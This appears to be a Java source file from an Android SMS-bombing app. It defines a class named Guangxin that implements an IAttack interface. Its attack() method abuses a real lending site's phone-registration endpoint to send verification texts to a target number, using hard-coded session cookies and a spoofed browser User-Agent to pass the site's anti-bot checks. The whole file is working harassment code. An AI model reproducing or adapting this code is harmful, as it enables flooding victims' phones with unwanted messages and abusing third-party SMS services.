package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Guangxin implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "phone=" + Utils.getNumber(MainApplication.context);

        Request request = new Request.Builder()
                .url("https://www.guangxindai.com/ajax/sendmobile/phone_reg?0.8841223937396279&phone="+ Utils.getNumber(MainApplication.context)+"&verifycode=7253")
                .get()
                .addHeader("Cookie", "__jsluid=38892b6c95b6c1e1983ac653dab3389b; __jsl_clearance=1450272426.847|0|xF3Oh807WkDbxlzHXQwjzMXyZL0%3D; gxd_session=9LbHCvY5%2FcLQ0KKASHtuDqdoaALJ8dXdZITDazhnmUN4Fgx1DObhEFEMu8xbIwgQ72XU42CjQyJRCGN%2B%2F64m1yjdoZgReaFm7rMt5p6Urk4SZRTIU7GwxbOcZaI73STgFjIFPd8oZuyusvgqkFwTJVAkMXW3ylrUoBlMhKbqqFo%2B9voXIswabKgLLAHhoY1hiGNKFmSjMLNzTTCOZfCp3NQD4NezhhSWxcIk50H%2FTFFb627WyEFISw3pE11FTUhqemNcmDGbnRcas%2Ba6TfkUloVRYiRp95YUnMcjbU2g8xI4cLj11rVt%2Bkl1V9ZL%2BaDPZhsKTN%2BUQ31eMw4NJJvYKaQhEXYXPBohsUzqG0lWXC%2FPsfNdbcAlATXjagLt0XjwpfiA1WkYRWR7qrRbctpJ0q0fsGO1YhUqzBAlaXN%2F3EBVYpat3fDT9uYzprw1G%2BGZsU2njNzF%2FUL4c7K39Eojpb67Hw%2BPWzNn79ikklsa7lH4qIn1ce19%2BbFVTfyNe%2FLF; redirect_to=%2F; _ga=GA1.2.2118888482.1450272430; _gat=1; Hm_lvt_bd18eeb33c99731eb2652456583cbb44=1450272430; Hm_lpvt_bd18eeb33c99731eb2652456583cbb44=1450272435")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
